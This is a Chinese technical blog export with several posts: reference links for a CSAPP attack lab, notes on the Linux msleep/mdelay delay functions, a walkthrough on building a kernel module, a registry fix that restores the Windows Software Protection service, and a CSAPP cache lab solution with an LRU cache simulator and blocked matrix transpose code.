<p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab</a></p>
<p><a href="https://wdxtub.com/csapp/thick-csapp-lab-3/2016/04/16/">读厚CSAPP III Attack Lab</a></p>
<p><a href="https://blog.csdn.net/sdulibh/article/details/17913815?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">良性代码，恶意利用：浅谈 Return-Oriented 攻击</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>内核延时函数msleep和mdelay区别</title>
    <url>/2020/08/15/2020-08-15-difference-between-msleep-and-mdelay/</url>
    <content><![CDATA[<p><code>msleep</code>和<code>mdelay</code>都是内核的延时函数，原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mdelay</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> msecs)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">msleep</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> millisecs)</span>;</span><br></pre></td></tr></table></figure>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p><code>mdelay</code>是忙等待函数，会占用<code>CPU</code>资源，延迟时间是准确的。</p>
<p><code>msleep</code>是休眠函数，不占用<code>CPU</code>资源，延迟时间通常高于给定值。</p>
<span id="more"></span>

<p><strong>具体可以参考如下文章：</strong></p>
<p><a href="https://topic.alibabacloud.com/a/the-difference-between-mdelay--and-msleep--in-linux-linux_1_16_20266988.html">The difference between Mdelay and Msleep in Linux</a></p>
<p><a href="https://www.cnblogs.com/xihong2014/p/6740876.html">Linux中内核延时函数</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核模块编译方法</title>
    <url>/2020/08/15/2020-08-15-how-to-compile-kernel-module/</url>
    <content><![CDATA[<h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><p><code>Linux debian 4.19.0-10-amd64</code></p>
<h3 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h3><h4 id="0-准备编译所需的内核头文件"><a href="#0-准备编译所需的内核头文件" class="headerlink" title="0. 准备编译所需的内核头文件"></a>0. 准备编译所需的内核头文件</h4><p>系统默认内核头文件路径在&#x2F;lib&#x2F;modules&#x2F;`uname -r`，先确认该路径是否存在：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /lib/modules/`uname -r`/build</span><br></pre></td></tr></table></figure>

<p>如路径不存在，需要先安装内核头文件，方法如下：</p>
<span id="more"></span>

<ul>
<li><p>获取内核版本，使用<code>uname -r</code>查看，这里为<code>4.19.0-10-amd64</code></p>
</li>
<li><p><code>apt search 4.19.0-10-amd64</code>查找安装包名称，这里为<code>linux-headers-4.19.0-10-amd64</code></p>
</li>
<li><p>安装内核头文件，执行<code>apt-get install linux-headers-4.19.0-10-amd64</code>，安装路径为<code>/usr/src/linux-headers-4.19.0-10-amd64</code></p>
</li>
</ul>
<h4 id="1-编写hello-c"><a href="#1-编写hello-c" class="headerlink" title="1. 编写hello.c"></a>1. 编写<code>hello.c</code></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>           <span class="comment">// 编译内核模块必须加载的头文件module.h</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_init\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);    <span class="comment">// 模块加载</span></span><br><span class="line">module_exit(hello_exit);    <span class="comment">// 模块卸载</span></span><br></pre></td></tr></table></figure>

<p>模块加载时打印<code>hello_init</code>, 模块卸载时打印<code>hello_exit</code>。</p>
<h4 id="2-编写Makefile"><a href="#2-编写Makefile" class="headerlink" title="2.编写Makefile"></a>2.编写Makefile</h4><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">obj-m += hello.o    						<span class="comment"># -m编译内核模块</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">PWD=<span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">KDIR=/usr/src/linux-headers-4.19.0-10-amd64 <span class="comment"># 指定内核头文件路径</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules     <span class="comment"># -C指定内核头文件路径, M指定源码路径</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<p><code>PWD</code>指定源码路径，即<code>hello.c</code>的路径。</p>
<p><code>KDIR</code>指定内核源码路径。</p>
<p><code>KERNELRELEASE</code>是在内核源码的顶层Makefile里定义的变量，用法可参考<a href="https://blog.csdn.net/cjluxuwei/article/details/37878021">这篇文章</a></p>
<h4 id="3-加载模块"><a href="#3-加载模块" class="headerlink" title="3.加载模块"></a>3.加载模块</h4><p>加载ko：<code>insmod hello.ko</code></p>
<p>卸载ko：<code>rmmod hello.ko</code></p>
<p>查看ko是否加载：<code>lsmod | grep hello.ko</code></p>
<p>打印信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># dmesg -c</span><br><span class="line">[  821.764791] hello_init</span><br><span class="line">[  897.219392] hello_exit</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Office无法找到应用程序许可证</title>
    <url>/2020/08/15/2020-08-15-office-cannot-find-license/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>打开<code>office</code>软件失败，提示无法找到应用程序的许可证。</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p><code>Software Protection</code>服务启动失败，可以通过<code>services.msc</code>查看该服务的启动状态</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>修改注册表，将如下文本复制到文件，文件名改为<code>software prtection服务.reg</code>, 双击该文件即可。</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc]</span><br><span class="line">&quot;StartProtected&quot;=dword:00000001</span><br><span class="line">&quot;DisplayName&quot;=&quot;@%SystemRoot%\\system32\\sppsvc.exe,-101&quot;</span><br><span class="line">&quot;ErrorControl&quot;=dword:00000001</span><br><span class="line">&quot;ImagePath&quot;=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\</span><br><span class="line">  74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,73,\</span><br><span class="line">  00,70,00,70,00,73,00,76,00,63,00,2e,00,65,00,78,00,65,00,00,00</span><br><span class="line">&quot;Start&quot;=dword:00000002</span><br><span class="line">&quot;Type&quot;=dword:00000010</span><br><span class="line">&quot;Description&quot;=&quot;@%SystemRoot%\\system32\\sppsvc.exe,-100&quot;</span><br><span class="line">&quot;DependOnService&quot;=hex(7):52,00,70,00,63,00,53,00,73,00,00,00,00,00</span><br><span class="line">&quot;ObjectName&quot;=&quot;NT AUTHORITY\\NetworkService&quot;</span><br><span class="line">&quot;ServiceSidType&quot;=dword:00000001</span><br><span class="line">&quot;RequiredPrivileges&quot;=hex(7):53,00,65,00,41,00,75,00,64,00,69,00,74,00,50,00,72,\</span><br><span class="line">  00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,43,00,68,00,\</span><br><span class="line">  61,00,6e,00,67,00,65,00,4e,00,6f,00,74,00,69,00,66,00,79,00,50,00,72,00,69,\</span><br><span class="line">  00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,43,00,72,00,65,00,\</span><br><span class="line">  61,00,74,00,65,00,47,00,6c,00,6f,00,62,00,61,00,6c,00,50,00,72,00,69,00,76,\</span><br><span class="line">  00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,49,00,6d,00,70,00,65,00,\</span><br><span class="line">  72,00,73,00,6f,00,6e,00,61,00,74,00,65,00,50,00,72,00,69,00,76,00,69,00,6c,\</span><br><span class="line">  00,65,00,67,00,65,00,00,00,00,00</span><br><span class="line">&quot;DelayedAutoStart&quot;=dword:00000001</span><br><span class="line">&quot;FailureActions&quot;=hex:80,51,01,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\</span><br><span class="line">  00,01,00,00,00,c0,d4,01,00,01,00,00,00,e0,93,04,00,00,00,00,00,00,00,00,00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc\Security]</span><br><span class="line">&quot;Security&quot;=hex:01,00,14,80,a0,00,00,00,ac,00,00,00,14,00,00,00,30,00,00,00,02,\</span><br><span class="line">  00,1c,00,01,00,00,00,02,80,14,00,ff,01,0f,00,01,01,00,00,00,00,00,01,00,00,\</span><br><span class="line">  00,00,02,00,70,00,05,00,00,00,00,00,14,00,ff,01,02,00,01,01,00,00,00,00,00,\</span><br><span class="line">  05,12,00,00,00,00,00,18,00,fd,01,0f,00,01,02,00,00,00,00,00,05,20,00,00,00,\</span><br><span class="line">  20,02,00,00,00,00,14,00,9d,01,02,00,01,01,00,00,00,00,00,05,04,00,00,00,00,\</span><br><span class="line">  00,14,00,9d,01,02,00,01,01,00,00,00,00,00,05,06,00,00,00,00,00,14,00,14,00,\</span><br><span class="line">  00,00,01,01,00,00,00,00,00,05,0b,00,00,00,01,01,00,00,00,00,00,05,12,00,00,\</span><br><span class="line">  00,01,01,00,00,00,00,00,05,12,00,00,00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc\TriggerInfo]</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc\TriggerInfo\0]</span><br><span class="line">&quot;Type&quot;=dword:00000014</span><br><span class="line">&quot;Action&quot;=dword:00000001</span><br><span class="line">&quot;GUID&quot;=hex:da,8a,52,f5,5f,be,14,4f,8a,ef,a9,5d,e7,28,11,61</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/jenyzhang/article/details/51867485">https://blog.csdn.net/jenyzhang/article/details/51867485</a></p>
]]></content>
      <categories>
        <category>Win</category>
      </categories>
      <tags>
        <tag>Win</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP 缓存实验</title>
    <url>/2020/08/16/2020-08-16-csapp-cachelab/</url>
    <content><![CDATA[<h3 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h3><p>编写一个通用高速缓存模拟器，并优化小型矩阵转置核心函数，以最小化对模拟高速缓存的不命中次数。</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="1-局部性原理"><a href="#1-局部性原理" class="headerlink" title="1. 局部性原理"></a>1. 局部性原理</h4><p>局部性通常有两种形式：</p>
<ul>
<li>时间局部性：被引用过一次的内存位置很可能在不远的将来被多次引用。</li>
<li>空间局部性：如一个内存位置被引用，其附近的内存位置很可能在不远的将来被引用。</li>
</ul>
<span id="more"></span>

<h4 id="2-存储器层次结构"><a href="#2-存储器层次结构" class="headerlink" title="2. 存储器层次结构"></a>2. 存储器层次结构</h4><p>下图展示了一个典型的存储器层次结构：<br><img src="/2020/08/16/2020-08-16-csapp-cachelab/image1.png"></p>
<p>可以看出，从高往低走，存储设备变得更慢，更大，更便宜。</p>
<h4 id="3-缓存"><a href="#3-缓存" class="headerlink" title="3. 缓存"></a>3. 缓存</h4><p>缓存被组织成一个有S组，每组E行，每行由一个B字节数据块、一个有效位、一个标记位组成。结构如下：<br><img src="/2020/08/16/2020-08-16-csapp-cachelab/image2.png"></p>
<p>一个m位地址被划分为标记、组索引、块偏移三个部分。</p>
<p>缓存确定一个请求是否命中，然后抽取被请求字的过程分为三步：</p>
<ul>
<li>组选择：从地址中间抽取s位组索引，得到组号i。比如s&#x3D;4, 组索引为0010时，组号i &#x3D; 2。</li>
<li>行匹配：从地址抽取t位标记，与组i中每个行的标记进行比较，如标记相等且有效位为1则命中。</li>
<li>字抽取：根据地址的b位块偏移, 直接从行中得到数据。</li>
</ul>
<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>从<a href="http://csapp.cs.cmu.edu/3e/labs.html">CSAPP官网</a>获取实验文件。</p>
<p>阅读<a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">cachelab.pdf</a>，了解实验内容。</p>
<h3 id="实验一：-实现缓存模拟器"><a href="#实验一：-实现缓存模拟器" class="headerlink" title="实验一： 实现缓存模拟器"></a>实验一： 实现缓存模拟器</h3><p>修改<code>csim.c</code>， 实现<code>LRU</code>策略的缓存模拟器，最终目标是与<code>csim-ref</code>执行结果一致。</p>
<p><strong>实现要点：</strong></p>
<ul>
<li><p>使用<code>getopt</code>解析命令行参数，<code>man 3 getopt</code>查看用法。</p>
</li>
<li><p>解析<code>traces</code>文件，可以使用<code>fgets</code>和<code>sscanf</code>实现。</p>
</li>
<li><p>缓存结构本质是一个二维数组 <code>cache[S][E]</code>，但由于<code>s</code>, <code>E</code>, <code>b</code>不确定, 需要使用<code>malloc</code>分配。</p>
</li>
<li><p>缓存替换策略采用<code>LRU</code>，可通过每行设计一个时间戳，每更新一次缓存将时间戳加1。</p>
</li>
</ul>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令行参数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line">    <span class="type">int</span> E;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="type">char</span> traceFile[BUFFER_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// getopt解析命令行输入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">parseArgs</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Args *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opt == <span class="string">&#x27;h&#x27;</span>) &#123;</span><br><span class="line">            printHelp();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">            args-&gt;s = atoi(optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;E&#x27;</span>) &#123;</span><br><span class="line">            args-&gt;E = atoi(optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;b&#x27;</span>) &#123;</span><br><span class="line">            args-&gt;b = atoi(optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;t&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(args-&gt;traceFile, optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化Cache结构</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initCache</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="keyword">struct</span> Args *args)</span> &#123;</span><br><span class="line">    cache-&gt;s = args-&gt;s;</span><br><span class="line">    cache-&gt;S = <span class="number">1</span> &lt;&lt; cache-&gt;s;</span><br><span class="line">    cache-&gt;E = args-&gt;E;</span><br><span class="line">    cache-&gt;b = args-&gt;b;</span><br><span class="line">    cache-&gt;sets = (<span class="keyword">struct</span> CacheSet *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> CacheSet) * cache-&gt;S);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; ++i) &#123;</span><br><span class="line">        cache-&gt;sets[i].lines = (<span class="keyword">struct</span> CacheLine *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> CacheLine) * cache-&gt;E);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; cache-&gt;E; ++j) &#123;</span><br><span class="line">            cache-&gt;sets[i].lines[j].valid = INVALID;</span><br><span class="line">            cache-&gt;sets[i].lines[j].tag = INVALID_TAG;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放Cache</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">recycleCache</span><span class="params">(<span class="keyword">struct</span> Cache *cache)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; ++i) &#123;</span><br><span class="line">        <span class="built_in">free</span>(cache-&gt;sets[i].lines);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(cache-&gt;sets);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateTimeStamp</span><span class="params">(<span class="keyword">struct</span> Cache *cache)</span> &#123;</span><br><span class="line">    <span class="type">int</span> numSets = cache-&gt;S;</span><br><span class="line">    <span class="type">int</span> numLines = cache-&gt;E;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; numSets; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; numLines; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cache-&gt;sets[i].lines[j].valid == VALID) &#123;</span><br><span class="line">                ++cache-&gt;sets[i].lines[j].timestamp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="type">int64_t</span> addr, <span class="keyword">struct</span> Result *result)</span> &#123;</span><br><span class="line">    <span class="type">int</span> numLines = cache-&gt;E;</span><br><span class="line">    <span class="comment">// 标记 + 组索引(s位) + 块偏移(b位)</span></span><br><span class="line">    <span class="type">int</span> setIndex = (addr &gt;&gt; cache-&gt;b) &amp; (cache-&gt;S - <span class="number">1</span>); <span class="comment">// 先求s位组索引, 得到addr位于第几组</span></span><br><span class="line">    <span class="type">int</span> tag = addr &gt;&gt; (cache-&gt;s + cache-&gt;b);            <span class="comment">// 求出tag, 方法为地址右移s+b位</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CacheSet</span> *<span class="title">curSet</span> =</span> &amp;cache-&gt;sets[setIndex];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; numLines; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curSet-&gt;lines[i].tag == tag) &#123;  <span class="comment">// tag相等表示命中</span></span><br><span class="line">            ++result-&gt;hits;</span><br><span class="line">            curSet-&gt;lines[i].timestamp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不命中</span></span><br><span class="line">    ++result-&gt;misses;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; numLines; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curSet-&gt;lines[i].valid == INVALID) &#123; <span class="comment">// 找到一个空行</span></span><br><span class="line">            curSet-&gt;lines[i].tag = tag;</span><br><span class="line">            curSet-&gt;lines[i].valid = VALID;</span><br><span class="line">            curSet-&gt;lines[i].timestamp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有命中又没有空行, 表示冲突不命中</span></span><br><span class="line">    ++result-&gt;evictions;</span><br><span class="line">    <span class="type">int</span> maxIdx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxTime = curSet-&gt;lines[<span class="number">0</span>].timestamp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; numLines; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curSet-&gt;lines[i].timestamp &gt; maxTime) &#123;</span><br><span class="line">            maxTime = curSet-&gt;lines[i].timestamp;</span><br><span class="line">            maxIdx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    curSet-&gt;lines[maxIdx].tag = tag;</span><br><span class="line">    curSet-&gt;lines[maxIdx].timestamp = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateCache</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="type">char</span> ch, <span class="type">int64_t</span> addr, <span class="keyword">struct</span> Result *result)</span></span><br><span class="line">&#123;</span><br><span class="line">    update(cache, addr, result);</span><br><span class="line">    <span class="keyword">if</span>(ch == <span class="string">&#x27;M&#x27;</span>) &#123;                 <span class="comment">// 一次读取加上一次写入, 相当于update两次</span></span><br><span class="line">        update(cache, addr, result);</span><br><span class="line">    &#125;</span><br><span class="line">    updateTimeStamp(cache);         <span class="comment">// 每条指令执行后更新timestamp</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DoParse</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="type">char</span> *traceFile, <span class="keyword">struct</span> Result *result)</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int64_t</span> addr;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    fp = fopen(traceFile, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open traceFile: %s failed!\n&quot;</span>, traceFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// fgets + sscanf解析trace文件</span></span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, BUFFER_SIZE, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>) &#123; <span class="comment">// &#x27;I&#x27;表示指令cache，不做处理</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sscanf</span>(buf, <span class="string">&quot; %c %lx,%d\n&quot;</span>, &amp;ch, &amp;addr, &amp;size);</span><br><span class="line">        updateCache(cache, ch, addr, result);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Args</span> <span class="title">args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Cache</span> <span class="title">cache</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Result</span> <span class="title">res</span> =</span> &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    parseArgs(argc, argv, &amp;args);</span><br><span class="line">    initCache(&amp;cache, &amp;args);</span><br><span class="line">    DoParse(&amp;cache, args.traceFile, &amp;res);</span><br><span class="line">    recycleCache(&amp;cache);</span><br><span class="line">    printSummary(res.hits, res.misses, res.evictions);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="实验二：-优化矩阵转置"><a href="#实验二：-优化矩阵转置" class="headerlink" title="实验二： 优化矩阵转置"></a>实验二： 优化矩阵转置</h3><p>实验二要求在<code>trans.c</code>中实现矩阵转置函数，最小化缓存不命中的次数。</p>
<p>实验二中的缓存结构为 <code>S = 5, E = 1, b = 5</code>，即32组，每组1行，每行32字节，每行可放8个<code>int</code>数</p>
<p>利用分块技术和局部变量减少miss，分块技术可参考 <a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">waside-blocking.pdf</a></p>
<h4 id="32-32"><a href="#32-32" class="headerlink" title="32 * 32"></a>32 * 32</h4><p>由于缓存的每一行能放8个数，考虑将32 * 32划分为16个8 * 8 的分块，每次处理单个8 * 8的分块，再利用局部变量减少miss。代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> a1, a2, a3, a4, a5, a6, a7, a8;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; M; i += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; N; j += <span class="number">8</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = i; k &lt; i + <span class="number">8</span>; ++k) &#123;</span><br><span class="line">                    a1 = A[k][j];</span><br><span class="line">                    a2 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                    a3 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                    a4 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                    a5 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                    a6 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                    a7 = A[k][j+<span class="number">6</span>];</span><br><span class="line">                    a8 = A[k][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[j][k] = a1;</span><br><span class="line">                    B[j+<span class="number">1</span>][k] = a2;</span><br><span class="line">                    B[j+<span class="number">2</span>][k] = a3;</span><br><span class="line">                    B[j+<span class="number">3</span>][k] = a4;</span><br><span class="line">                    B[j+<span class="number">4</span>][k] = a5;</span><br><span class="line">                    B[j+<span class="number">5</span>][k] = a6;</span><br><span class="line">                    B[j+<span class="number">6</span>][k] = a7;</span><br><span class="line">                    B[j+<span class="number">7</span>][k] = a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果改用4 * 4分块，会导致缓存利用不足，因为缓存的一行可以放8个数；也不能用16 * 16分块，会导致块内冲突。</p>
<p>使用8个局部变量(<code>a1 ~ a8</code>）的目的是避免写入B时，在对角线发生冲突不命中。因为A和B中相同位置的元素会映射到同一行。而矩阵转置不会改变对角线上的元素位置，导致多出现两次不命中。</p>
<h4 id="61-67"><a href="#61-67" class="headerlink" title="61 * 67"></a>61 * 67</h4><p>和32*32类似，尝试分块法，发现8 * 8即可满足要求，再利用局部变量减少<code>miss</code>。</p>
<p>首先对56 * 64部分进行8 * 8分块，其余部分直接简单转置即可。</p>
